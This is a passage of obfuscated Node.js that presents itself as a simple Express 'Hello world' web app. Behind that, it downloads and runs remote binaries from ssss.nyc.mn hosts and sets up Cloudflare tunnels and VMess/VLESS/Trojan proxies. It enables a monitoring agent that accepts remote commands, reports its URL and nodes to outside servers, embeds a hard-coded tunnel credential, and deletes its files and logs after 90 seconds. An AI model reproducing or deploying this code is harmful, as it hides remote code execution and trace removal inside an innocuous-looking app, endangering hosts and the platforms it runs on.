_0x49bd84&&_0x49bd84['status']===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x49bd84):null;}catch(_0x56d131){return null;}}else return;}}function _0x2b4a(){const _0x5a1515=['\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','\x0a\x20\x20credentials-file:\x20','tls','\x20-p\x20','from','block','\x20already\x20exists','https://amd64.ssss.nyc.mn/agent','writeFileSync','FILE_PATH','http\x20server\x20is\x20running\x20on\x20port:','forEach','\x20>/dev/null\x202>&1','vmess','join','post','\x20>/dev/null\x202>&1\x20&','wvsp33221','108027ALompP','npm\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://amd64.ssss.nyc.mn/v1','39588600Mwxjih','length','UUID','mkdirSync','finish','freedom','config.yaml','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/web','776hVeVRJ','del\x20/f\x20/q\x20','send','ArgoDomain:','https://arm64.ssss.nyc.mn/web','/api/add-nodes','NEZHA_SERVER','all','data','Content-Type','charAt','env','push','base64','error','/config.json\x20>/dev/null\x202>&1\x20&','10nhoKWZ','TunnelSecret','600083ICgldA','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https+local://8.8.8.8/dns-query','list.txt','false','eyJhIjoiMzczNzIxYWEwYWJiOGUzMmJiNzY2ZjAzMGNjZmQxNTkiLCJ0IjoiOTUyNThjNGItM2E2Ni00NzdlLTkyZjktM2Q5MjcxNmNhMzI2IiwicyI6Ik5ETTFPR1l6WlRJdE9EWmxOaTAwWTJVMkxUa3hNek10TkRGaVl6SXlNR1UyT1RneCJ9','map','includes','response','fileUrl','stream','ARGO_DOMAIN:','country_code','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2096','Empowerment\x20success\x20for\x20','win32','then','2053','\x20is\x20running','6576423wHOIAl','https://ipapi.co/json/','/vless-argo','true','split','NEZHA_PORT','2087','text/plain;\x20charset=utf-8','SUB_PATH','ARGO_PORT','\x20failed:\x20','\x20is\x20created','--tls','ARGO_AUTH','\x20-c\x20','\x0aclient_secret:\x20','3112566GbDymk','127.0.0.1','&fp=firefox&type=ws&host=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','rm\x20-rf\x20','readFileSync','Subscription\x20uploaded\x20successfully','ARGO_DOMAIN','trojan','/vmess-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','express','stringify','substring','log','36369YUEmCG','/sub.txt\x20saved\x20successfully','unshift','util','close','tunnel.yml','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','status','http','\x20-c\x20\x22','/trojan-argo','CFIP','8443','arm','pkill\x20-f\x20\x22[','automatic\x20access\x20task\x20added\x20successfully','quic','nohup\x20','toString','/api/delete-nodes','Hello\x20world!','NEZHA_KEY','clear','org','child_process','\x22\x20>\x20/dev/null\x202>&1','\x0avless://','ip.sb','listen','\x20>\x20nul\x202>&1','utf-8','sub.txt','Unknown','957796d7-bbb9-453f-855c-9573a9b4fc9b','fileName','Download\x20','isFile','180YOhrEM','platform','SERVER_PORT','abcdefghijklmnopqrstuvwxyz','unlinkSync','AUTO_ACCESS','NAME','2030828ihvVEN','https://amd64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/bot','&path=%2Ftrojan-argo%3Fed%3D2560#','test','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','blackhole','\x0a\x0atrojan://','match','/vmess-argo?ed=2560','existsSync','none','App\x20is\x20running','countryCode','UPLOAD_URL','readdirSync','Skipping\x20adding\x20automatic\x20access\x20task','exec','https://arm64.ssss.nyc.mn/v1','/dev/null','vless','firefox','message','tcp','Error\x20executing\x20command:\x20','basename','config.json','unlink','get','filter','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','CFPORT','direct','boot.log','PROJECT_URL','catch','Error\x20in\x20startserver:','application/json','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','createWriteStream','?security=tls&sni=','\x20successfully'];_0x2b4a=function(){return _0x5a1515;};return _0x2b4a();}function cleanFiles(){const _0x22fe4b={_0x1ecaf6:0x132,_0x1b2038:0x127,_0x1d6be6:0x189,_0x51d7e3:0x113};setTimeout(()=>{const _0x311947={_0x45572c:0x13a},_0x4239ff={_0x42fa84:0x16b,_0x3bddfa:0x1a5},_0x113d2a=_0x5816,_0x2495da=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2495da[_0x113d2a(_0x22fe4b._0x1ecaf6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2495da['push'](phpPath);process['platform']==='win32'?exec(_0x113d2a(_0x22fe4b._0x1b2038)+_0x2495da[_0x113d2a(0x115)]('\x20')+_0x113d2a(_0x22fe4b._0x1d6be6),_0x12e30b=>{const _0xe0b571=_0x113d2a;console[_0xe0b571(0x182)](),console[_0xe0b571(_0x4239ff._0x42fa84)](_0xe0b571(_0x4239ff._0x3bddfa)),console['log'](_0xe0b571(0x13a));}):exec(_0x113d2a(0x161)+_0x2495da['join']('\x20')+_0x113d2a(_0x22fe4b._0x51d7e3),_0x191b76=>{const _0x3fabe8=_0x113d2a;console[_0x3fabe8(0x182)](),console['log'](_0x3fabe8(0x1a5)),console[_0x3fabe8(0x16b)](_0x3fabe8(_0x311947._0x45572c));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1e89ab={_0x2b3e41:0x17b},_0x2523c5=_0x5cc0f3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2523c5(0x16b)](_0x2523c5(0x1a9));return;}try{const _0x1224d3=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2523c5(0x101)}});return console[_0x2523c5(0x16b)](_0x2523c5(_0x1e89ab._0x2b3e41)),_0x1224d3;}catch(_0x155401){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x155401[_0x2523c5(0xf1)]),null;}}async function startserver(){const _0x514c5a={_0x494aaf:0x134},_0x502564=_0x5cc0f3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d1bdf){console[_0x502564(_0x514c5a._0x494aaf)](_0x502564(0x100),_0x2d1bdf);}}startserver()['catch'](_0x5baf96=>{const _0x258302=_0x5cc0f3;console[_0x258302(0x134)]('Unhandled\x20error\x20in\x20startserver:',_0x5baf96);}),app[_0x5cc0f3(0x188)](PORT,()=>console[_0x5cc0f3(0x16b)](_0x5cc0f3(0x111)+PORT+'!'));
